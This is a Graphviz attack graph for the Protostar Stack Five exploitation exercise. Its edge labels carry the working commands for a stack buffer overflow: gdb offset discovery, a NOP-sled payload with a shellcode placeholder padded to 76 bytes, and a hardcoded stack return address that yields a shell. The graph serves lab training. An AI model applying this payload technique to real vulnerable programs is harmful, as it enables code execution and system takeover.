digraph AttackGraph {
  rankdir=LR;
  graph [fontsize=12, labelloc="t", label="Attack Graph (reference) - Protostar Stack Five"];
  node [shape=box, style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica"];
  edge [color="#555555", fontname="Helvetica", fontsize=10];

  start [shape="box", style="rounded,filled", fillcolor="#EAF3FF", color="#444444", fontname="Helvetica", label="Start"];
  node0 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Saved EIP offset identified"];
  node1 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Shellcode payload prepared"];
  node2 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Return target into stack buffer identified"];
  node3 [shape="box", style="rounded,filled", fillcolor="#E8FFE8", color="#2E7D32", fontname="Helvetica", penwidth="2", label="Interactive shell obtained"];

  start -> node0 [color="#555555", fontname="Helvetica", fontsize="10", label="gdb -q /opt/protostar/bin/stack5"];
  node0 -> node1 [color="#555555", fontname="Helvetica", fontsize="10", label="python -c 'print \"\\x90\"*32 + \"<shellcode>\" + \"A\"*(76-32-len(\"<shellcode>\"))' > /tmp/stack5.in"];
  node1 -> node2 [color="#555555", fontname="Helvetica", fontsize="10", label="gdb -q /opt/protostar/bin/stack5"];
  node2 -> node3 [color="#555555", fontname="Helvetica", fontsize="10", label="python -c 'import struct; shell=\"\\x90\"*32 + \"<shellcode>\" + \"A\"*(76-32-len(\"<shellcode>\")); print shell + struct.pack(\"<I\", 0xbffff730)' | /opt/protostar/bin/stack5"];
}
